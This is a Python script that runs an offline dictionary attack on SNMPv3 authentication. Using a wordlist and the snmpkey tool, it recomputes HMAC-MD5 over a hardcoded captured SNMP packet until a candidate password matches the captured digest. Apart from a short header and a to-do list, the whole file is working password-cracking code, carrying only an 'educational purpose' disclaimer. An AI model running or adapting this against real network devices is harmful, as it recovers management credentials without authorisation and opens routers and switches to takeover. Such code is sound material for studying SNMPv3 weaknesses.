#!/usr/bin/env python
#-*- coding: utf-8 -*-

#==========================
#= Written by lutzenfried =
#==========================
#Use for educational purpose only

import subprocess
import os
import md5
import binascii

#=============
#Improvement
#=============
#User argument for wordlist path
#PCAP parsing, taking directly into a frame the following parameters : 
# - authenticatedWholeMsg
# - msgAuthoritativeEngineID
# - wholeMessage
#Replace automatically the msgAuthoritativeEngineID in the wholeMessage by 12 bytes x00 000000000000000000000000
#Incorpore Multi-processing

IPAD = "36363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636"
OPAD = "5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c"

authenticatedWholeMsg = "b92621f4a93d1bf9738cd5bd"
authenticatedWholeMsgReplace = "000000000000000000000000"
msgAuthoritativeEngineID = "80001f8880e9bd0c1d12667a5100000000"

initialWholeMessage= "3081800201033011020420dd06a7020300ffe30401050201030431302f041180001f8880e9bd0c1d12667a5100000000020105020120040475736572040c00000000000000000000000004003035041180001f8880e9bd0c1d12667a51000000000400a11e02046b4c5ac20201000201003010300e060a2b06010201041e0105010500"
initialWholeMessagetrue="30818002010330110204580b8cc7020300ffe30401050201030431302f041180001f888062dc7f4c15465c510000000002010302017c040475736572040c00000000000000000000000004003035041180001f888062dc7f4c15465c51000000000400a11e0204334304ff0201000201003010300e060a2b06010201041e0105010500"
wholeMessage = "3081800201033011020420dd06a7020300ffe30401050201030431302f041180001f8880e9bd0c1d12667a5100000000020105020120040475736572040cb92621f4a93d1bf9738cd5bd04003035041180001f8880e9bd0c1d12667a51000000000400a11e02046b4c5ac20201000201003010300e060a2b06010201041e0105010500"

dictionnary ="%Dictionnary_Wordlist_Path%"
listWithoutN = [] #Delete carriage return line feed \n

def bruteForce():

	with open(dictionnary) as f:
	                content = f.readlines()
	                listWithoutN = list(map(lambda x:x.strip(),content))
	try:
		for password in listWithoutN:
			p = subprocess.Popen(["snmpkey", "md5", password, msgAuthoritativeEngineID], stdout=subprocess.PIPE) #command system usage for snmpkey script and generation of authKey and privKey
			output, err = p.communicate()
			print ("Password tested : ",password)
			privKey = output.split("privKey: ", 1)[1]
			KeyTmp = privKey.replace('\n', ' ').replace('\r', '') #extendedAuthKey
			Keyfinal = KeyTmp[2:] #Erase "0x" from each extendedAuthKey generated by snmpkey
		
		#K1 calculcation : XOR(extendedAuthKey + IPAD) 32 + 128 char = 160 char
			KeyfinalInt = int(Keyfinal,base=16)
			IPADInt = int(IPAD,base=16)
			K1 = (IPADInt^KeyfinalInt)
			K1hex = (hex(K1)[2:130]) #Erase "0x" first 2 char and last char "L" from each line
			K1final = K1hex[96:130]+K1hex[0:96]
		
		#K2 calculcation : XOR(extendedAuthKey + OPAD) 32 + 128 char = 160 char
			KeyfinalInt = int(Keyfinal,base=16)
			IPADInt = int(OPAD,base=16)
			K2 = (IPADInt^KeyfinalInt)
			K2hex = (hex(K2)[2:130]) #Erase "0x" first 2 char and last char "L" from each line
			K2final = K2hex[96:130]+K2hex[0:96]
		
		#md5(Concatenation of K1 and initial wholeMsg)
			concatenateK1initwholeMsg = (K1final+initialWholeMessage)
			binary_string1 = binascii.unhexlify(concatenateK1initwholeMsg)
			mhashk1 = md5.new()
			mhashk1.update(binary_string1)
			k1wholeMsgHASH = (mhashk1.hexdigest())
		
		#K2 and hashMD5(K1 + Whole Message) (k1wholeMsgHASH)
			concatenanteK2andHashK1whole = (K2final + k1wholeMsgHASH)
			binary_string2 = binascii.unhexlify(concatenanteK2andHashK1whole)
			mhashk2 = md5.new()
			mhashk2.update(binary_string2)
			k2hash = (mhashk2.hexdigest())
		
		#Verification using k2hash, using 12 first bytes of k2hash
			hashverif = k2hash[0:24]
		
			if hashverif == authenticatedWholeMsg:
				print ("=======> Password FOUND !!! :", password)
				break
			else:
				pass
		
	except OSError:
		print ("Incorrect password value : Actual password attempt : ", value)
		print ("This script used snmpkey tool, please verify this tool is present on your system")

bruteForce()




